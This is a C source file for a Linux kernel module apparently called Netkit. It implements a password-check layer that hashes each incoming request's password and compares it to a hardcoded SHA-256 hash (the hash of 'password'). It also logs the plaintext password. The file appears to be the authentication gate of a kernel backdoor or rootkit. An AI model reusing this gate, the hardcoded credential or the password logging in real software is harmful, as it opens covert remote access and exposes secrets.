#include <linux/types.h>
#include <linux/string.h>

#include "auth_password.h"

#include "../../sys/debug.h"

#define CORRECT_HASH "\x5e\x88\x48\x98\xda\x28\x04\x71\x51\xd0\xe5\x6f\x8d\xc6\x29\x27\x73\x60\x3d\x0d\x6a\xab\xbd\xd6\x2a\x11\xef\x72\x1d\x15\x42\xd8"

#define SHA256_DIGEST_SIZE 32

int layer_auth_password_decode(u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
	uint8_t hash[SHA256_DIGEST_SIZE];
    size_t password_buflen;
    int retv;

    // require null-byte at end of password
    password_buflen = strnlen(req_buf, req_buflen);
    if (password_buflen == req_buflen)
    {
        retv = -EINVAL;
        goto LAB_ERR;
    }

    // does not include nullbyte
    NETKIT_LOG("[*] password: '%s'\n", req_buf);
    sha256(req_buf, password_buflen, hash);

    if (memcmp(CORRECT_HASH, hash, SHA256_DIGEST_SIZE) != 0)
    {
        retv = -EKEYREJECTED;
        goto LAB_ERR;
    }

    // just pull memory to keep buf ptr on slab base
    req_buflen -= password_buflen + 1;
    memmove(req_buf, req_buf + password_buflen + 1, req_buflen);

    *res_buf = req_buf;
    *res_buflen = req_buflen;

    return 0;

LAB_ERR:
    kzfree(req_buf, req_buflen);
    
    return retv;
}

const struct pipeline_ops LAYER_PASSWORD_AUTH_OPS = {
    .decode = layer_auth_password_decode,
    .encode = NULL,
    .handle_err = NULL
};
